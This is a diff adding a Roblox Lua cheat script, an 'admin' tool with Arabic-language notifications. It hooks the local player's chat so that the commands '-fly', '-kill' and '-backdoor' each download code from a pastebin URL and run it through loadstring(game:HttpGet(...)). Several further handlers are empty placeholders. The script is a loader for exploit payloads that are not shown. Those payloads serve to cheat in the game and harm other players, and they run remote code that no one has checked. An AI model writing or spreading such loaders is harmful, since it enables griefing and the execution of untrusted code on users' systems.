@@ -1,0 +1,80 @@
+local Players = game:GetService("Players")
+	game.StarterGui:SetCore("SendNotification", {
+		Title = " اكتب-ronaldo الاوامر لأضهار"; 
+		Text = "-kill / -backdoor - fly"; 
+		Icon = "rbxassetid://13191496688"; 
+		Duration = 20; 
+	})
+	local function chatted(msg)
+		if msg == "-fly" then
+			loadstring(game:HttpGet("https://pastebin.com/raw/0DE4GVqg"))()
+		end
+	end
+
+	Players.LocalPlayer.Chatted:Connect(chatted)
+
+	local Players = game:GetService("Players")
+
+	local function chatted(msg)
+		if msg == "-kill" then
+			loadstring(game:HttpGet("https://pastebin.com/raw/p01JvSJp"))()
+		end
+	end
+
+	Players.LocalPlayer.Chatted:Connect(chatted)
+	local function chatted(msg)
+		if msg == "-backdoor" then
+			loadstring(game:HttpGet("https://pastebin.com/raw/jBdvCHnv"))()
+		end
+	end
+
+	Players.LocalPlayer.Chatted:Connect(chatted)
+	local function chatted(msg)
+		if msg == "-الامر" then
+			--السكربت
+		end
+	end
+
+	Players.LocalPlayer.Chatted:Connect(chatted)
+	local function chatted(msg)
+		if msg == "-الامر" then
+			--السكربت
+		end
+	end
+
+	Players.LocalPlayer.Chatted:Connect(chatted)
+	local function chatted(msg)
+		if msg == "-الامر" then
+			--السكربت
+		end
+	end
+
+	Players.LocalPlayer.Chatted:Connect(chatted)
+	local function chatted(msg)
+		if msg == "-الامر" then
+			--السكربت
+		end
+	end
+
+	Players.LocalPlayer.Chatted:Connect(chatted)
+	local function chatted(msg)
+		if msg == "-الامر" then
+			--السكربت
+		end
+	end
+
+	Players.LocalPlayer.Chatted:Connect(chatted)
+	local function chatted(msg)
+		if msg == "-ronaldo" then
+			game.StarterGui:SetCore("SendNotification", {
+				Title = "script Admin Gamer Trale the best script admin"; -- the title (ofc)
+				Text = "-kill / -fly - backdoor"; -- what the text says (ofc)
+				Icon = "rbxassetid://13191496688"; -- the image if u want. 
+				Duration = 10; -- how long the notification should in secounds
+			})
+		end
+	end
+
+	Players.LocalPlayer.Chatted:Connect(chatted)
+
+	print("شغال")
